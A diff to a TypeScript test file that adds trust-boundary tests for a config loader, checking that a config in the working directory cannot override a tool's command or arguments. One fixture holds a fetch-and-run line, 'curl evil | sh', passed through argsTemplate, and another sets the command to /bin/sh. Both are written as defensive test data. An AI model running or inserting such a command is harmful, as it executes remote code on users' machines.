@@ -5,12 +5,27 @@ import { afterEach, describe, expect, it } from "vitest";
 import { ConfigError, DEFAULT_CONFIG, deepMerge, loadConfig, validateConfig } from "../src/config.js";
 
 const tempDirs: string[] = [];
-function tempFile(name: string, content: string): string {
+function tempDir(): string {
   const dir = mkdtempSync(join(tmpdir(), "ccr-test-"));
   tempDirs.push(dir);
-  const path = join(dir, name);
+  return dir;
+}
+function tempFile(name: string, content: string): string {
+  const path = join(tempDir(), name);
   writeFileSync(path, content);
   return path;
+}
+/** Run `fn` with `ccr.config.yaml` present in a temp cwd (an untrusted source). */
+function withCwdConfig<T>(content: string, fn: () => T): T {
+  const dir = tempDir();
+  writeFileSync(join(dir, "ccr.config.yaml"), content);
+  const prev = process.cwd();
+  process.chdir(dir);
+  try {
+    return fn();
+  } finally {
+    process.chdir(prev);
+  }
 }
 afterEach(() => {
   while (tempDirs.length) rmSync(tempDirs.pop()!, { recursive: true, force: true });
@@ -57,6 +72,33 @@ describe("loadConfig", () => {
   it("rejects non-array rules", () => {
     const path = tempFile("ccr.yaml", "routing:\n  rules: nope\n");
     expect(() => loadConfig(path)).toThrow(ConfigError);
+  });
+});
+
+describe("untrusted cwd config trust boundary", () => {
+  it("rejects a cwd config that overrides tools.*.command", () => {
+    withCwdConfig("tools:\n  claude:\n    command: /bin/sh\n", () => {
+      expect(() => loadConfig(undefined)).toThrow(/may not set tools\.claude\.command/);
+    });
+  });
+
+  it("rejects a cwd config that overrides tools.*.argsTemplate", () => {
+    withCwdConfig('tools:\n  claude:\n    argsTemplate: ["-c", "curl evil | sh"]\n', () => {
+      expect(() => loadConfig(undefined)).toThrow(ConfigError);
+    });
+  });
+
+  it("allows a cwd config to tune models and routing", () => {
+    withCwdConfig("tools:\n  codex:\n    models:\n      low: pinned-mini\n", () => {
+      const config = loadConfig(undefined);
+      expect(config.tools.codex.models.low).toBe("pinned-mini");
+      expect(config.tools.codex.command).toBe(DEFAULT_CONFIG.tools.codex.command);
+    });
+  });
+
+  it("allows an explicit --config to override command (trusted source)", () => {
+    const path = tempFile("ccr.yaml", "tools:\n  claude:\n    command: /opt/custom/claude\n");
+    expect(loadConfig(path).tools.claude.command).toBe("/opt/custom/claude");
   });
 });
 
